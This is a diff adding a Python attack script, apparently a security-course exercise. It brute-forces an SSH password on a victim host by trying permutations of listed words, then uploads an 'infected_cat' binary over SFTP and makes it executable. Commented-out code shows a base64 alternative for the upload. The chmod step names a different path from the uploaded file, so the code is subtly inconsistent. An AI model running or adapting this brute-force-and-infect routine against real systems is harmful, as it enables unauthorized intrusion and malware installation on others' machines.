@@ -1,0 +1,106 @@
+#! /usr/bin/env python3
+
+import sys
+import itertools
+import paramiko
+import time
+
+def try_passwd(victim_ip, username, pwds):
+
+    # tmp = pwds[0]
+    # pwds[0] = pwds[len(pwds)-1]
+    # pwds[len(pwds)-1] = tmp
+
+    for i in range(1, len(pwds)+1):
+        print(i)
+        perm_pwds = itertools.permutations(pwds, i)
+
+        for perm in perm_pwds:
+            # print(perm)
+            pwd = ''
+            for element in perm:
+                pwd += element
+
+            client = ssh_connect(victim_ip, username, pwd)
+            if client:
+                return client
+
+def ssh_connect(victim_ip, username, password):
+
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+        # client = paramiko.SSHClient()
+        # client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(hostname=victim_ip, username=username, password=password, banner_timeout=500)
+
+    except paramiko.AuthenticationException:
+
+        print(f'bad password {password} length {len(password)}')
+        return False
+
+    except Exception as e:
+        # print('Waiting for 10 seconds to reconnect')
+        client.close()
+        time.sleep(10)
+
+        return ssh_connect(victim_ip, username, password)
+
+    else:
+        print(f'pass {password}')
+        return client
+
+def main():
+    # (TASK 1) crack ssh password
+    pwds = []
+    username = 'csc2023'
+
+    victim_ip = sys.argv[1]
+    attacker_ip = sys.argv[2]
+    attacker_port = sys.argv[3]
+
+    with open('/home/csc2023/materials/victim.dat', 'r') as f:
+        for line in f:
+            line = line.strip('\n')
+            pwds.append(line)
+
+    print(pwds)
+
+    client = try_passwd(victim_ip, username, pwds)
+    
+    ### ssh ip and port
+    host_addr = sys.argv[2]
+    host_port = sys.argv[3]
+    
+    ### echo "host_addr\nhost_port" > attack.txt
+	#ssh_cmd = "echo " + "'''" + host_addr + "\n" + host_port + "'''" + "> attack.txt"
+	#print(ssh_cmd)
+	#stdin, stdout, stderr = client.exec_command(ssh_cmd)
+
+    # (TASK 2) compressing cat
+    
+    ### sftp connection to victim
+    sftp_client = client.open_sftp()
+    local_path = "./infected_cat"
+    remote_path = "./cat"
+
+    sftp_client.put(local_path, remote_path)
+    sftp_client.close()
+
+    stdin, stdou, stderr = client.exec_command("chmod +x ./infected_cat")
+    
+	#with open ('infected_cat', 'rb') as f:
+	#    b64 = b64encode(f.read())
+
+	#stdin, stdout, stderr = client.exec_command('base64 -d > infected_cat')
+	#stdin.write(b64)
+
+	#client.exec_command('chmod +x infected_cat')
+
+    print("infected!")
+
+
+if __name__ == '__main__':
+    main()
+
